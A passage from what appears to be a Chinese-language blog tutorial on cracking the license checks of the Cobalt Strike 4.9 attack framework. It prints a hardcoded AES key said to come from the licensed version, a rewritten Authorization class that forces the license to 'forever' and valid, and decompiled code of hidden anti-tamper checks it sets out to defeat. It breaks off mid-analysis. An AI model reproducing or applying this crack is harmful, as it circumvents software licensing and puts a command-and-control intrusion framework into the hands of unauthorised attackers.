function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES/CBC/NoPadding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>C</span> <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES/CBC/NoPadding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>F</span> <span class="token operator">=</span> <span class="token class-name">Mac</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"HmacSHA256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span></code></pre><p>我们看 SleevedResource.Setup(var6);  var6是哪里来的我就不截图了。看这个架势是从.auth文件里面读取的。这搞到这里就没办法了似乎这个var6值搞不定了。并且从代码里面看貌似是AES\CBC的秘钥。我们翻看github不难发现有个 4.9从正版提取出来的var6我们看看 <a href="https://github.com/kyxiaxiang/CrackSleeve4.9">https://github.com/kyxiaxiang/CrackSleeve4.9</a></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var12 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">=</span> <span class="token string">"Could not read "</span> <span class="token operator">+</span> var1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token class-name">AuthCrypto</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AuthCrypto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> var3<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>var12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>             <span class="token class-name">DataParser</span> var5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataParser</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>             var5<span class="token punctuation">.</span><span class="token function">big</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">readBytes</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我们发现秘钥为<br> private static byte[] OriginKey &#x3D; {-1, 12, -6, 65, 7, -47, 91, 48, 17, 61, 29, 43, -99, -23, 21, 109}; 所以我们定义var6为<br> 所以我们新的文件代码为<br> <pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Authorization</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">protected</span> <span class="token class-name">String</span> validto <span class="token operator">=</span> <span class="token string">"forever"</span><span class="token punctuation">;</span> <span class="token comment">//修改部分</span>   <span class="token keyword">protected</span> <span class="token class-name">String</span> error <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token comment">//修改部分</span>   <span class="token keyword">protected</span> <span class="token keyword">boolean</span> valid <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token comment">//修改部分</span>   <span class="token keyword">public</span> <span class="token class-name">Authorization</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//修改部分</span>          <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"bypass Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">SleevedResource<span class="token punctuation">.</span>Setup</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token keyword">int</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">></span> <span class="token number">999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">int</span> var2 <span class="token operator">=</span> <span class="token number">2000</span> <span class="token operator">+</span> var1 <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>         <span class="token keyword">int</span> var3 <span class="token operator">=</span> var1 <span class="token operator">%</span> <span class="token number">10000</span> <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span>         <span class="token keyword">int</span> var4 <span class="token operator">=</span> var1 <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span>         <span class="token keyword">byte</span> var5 <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>         <span class="token keyword">int</span> var6 <span class="token operator">=</span> <span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> var5<span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">></span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Calendar</span> var7 <span class="token operator">=</span> <span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var7<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var7<span class="token punctuation">.</span><span class="token function">setLenient</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>               var7<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var3 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span>               var7<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var9<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isPerpetual</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token string">"forever"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>validto<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>valid<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">:</span> <span class="token string">"Authorization file is not for Cobalt Strike 4.9"</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">parseDate</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>validto<span class="token punctuation">,</span> <span class="token string">"yyyyMMdd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isExpired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">whenExpires</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">long</span> var1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">==</span> <span class="token number">1L</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token string">"in 1 day ("</span> <span class="token operator">+</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> var1 <span class="token operator">&lt;=</span> <span class="token number">0L</span> <span class="token operator">?</span> <span class="token string">"TODAY ("</span> <span class="token operator">+</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span> <span class="token operator">:</span> <span class="token string">"in "</span> <span class="token operator">+</span> var1 <span class="token operator">+</span> <span class="token string">" days ("</span> <span class="token operator">+</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isAlmostExpired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">long</span> var1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> var1 <span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token keyword">int</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">86400000L</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>var0<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><br>如下图 注意每次改完要重新进行build 然后在运行<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101711436.png" alt="如图"><br>我们运行一下看看。发现还是不行我们推测是在这里  A &#x3D; new MultiFrame(); 有暗桩<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101715435.png" alt="如图"><br>我们来分析一下这个代码</p><pre class="language-java" data-language="java"><code class="language-java">csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\aggressor\<span class="token class-name">MultiFrame</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token keyword">protected</span> <span class="token class-name">MultiFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">checkAuthFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BorderLayout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>toolbar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JToolBar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JPanel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cards <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CardLayout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span><span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cards<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">"Center"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>buttons <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setDefaultCloseOperation</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setSize</span><span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setExtendedState</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setIconImage</span><span class="token punctuation">(</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">getImage</span><span class="token punctuation">(</span><span class="token string">"resources/armitage-icon.gif"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">KeyboardFocusManager</span><span class="token punctuation">.</span><span class="token function">getCurrentKeyboardFocusManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addKeyEventDispatcher</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">LookAndFeelManager</span><span class="token punctuation">.</span><span class="token function">adjustments</span><span class="token punctuation">(</span><span class="token class-name">MultiFrame</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">checkAuthFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Authorization</span> var0 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Authorization</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//由于这个验证已经被干掉了所以应不存在验证了看情况但是还是退出了</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var0<span class="token punctuation">.</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">print_error</span><span class="token punctuation">(</span><span class="token string">"License is invalid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>我们这时候看看这个类调用了。哪些不是系统类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">aggressor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">aggressor<span class="token punctuation">.</span>ui<span class="token punctuation">.</span></span><span class="token class-name">UseLookAndFeel<span class="token punctuation">.</span>LookAndFeelManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">common<span class="token punctuation">.</span></span><span class="token class-name">CommonUtils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">dialog<span class="token punctuation">.</span></span><span class="token class-name">DialogUtils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">BorderLayout</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">CardLayout</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Color</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Container</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">KeyEventDispatcher</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">KeyboardFocusManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">ActionEvent</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">ActionListener</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">KeyEvent</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">MouseAdapter</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">MouseEvent</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collection</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">LinkedList</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JComponent</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JFrame</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JMenuItem</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JOptionPane</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JPanel</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JPopupMenu</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JToggleButton</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JToolBar</span><span class="token punctuation">;</span></code></pre><p>发现是这个三个</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">aggressor<span class="token punctuation">.</span>ui<span class="token punctuation">.</span></span><span class="token class-name">UseLookAndFeel<span class="token punctuation">.</span>LookAndFeelManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">common<span class="token punctuation">.</span></span><span class="token class-name">CommonUtils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">dialog<span class="token punctuation">.</span></span><span class="token class-name">DialogUtils</span><span class="token punctuation">;</span></code></pre><p>我一个一个看首先我们看这个并且在里面调用为  LookAndFeelManager.adjustments(MultiFrame.class);</p><pre class="language-java" data-language="java"><code class="language-java">csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\aggressor\ui\<span class="token class-name">UseLookAndFeel</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">adjustments</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">A</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">boolean</span> var1 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> var2 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> var3 <span class="token operator">=</span> <span class="token string">"Y29tbW9uLkNvbW1vblV0aWxz"</span><span class="token punctuation">;</span> <span class="token comment">//common.CommonUtils</span>            <span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token string">"amF2YS5sYW5nLkNsYXNz"</span><span class="token punctuation">;</span> <span class="token comment">//java.lang.Class</span>            <span class="token class-name">String</span> var5 <span class="token operator">=</span> <span class="token 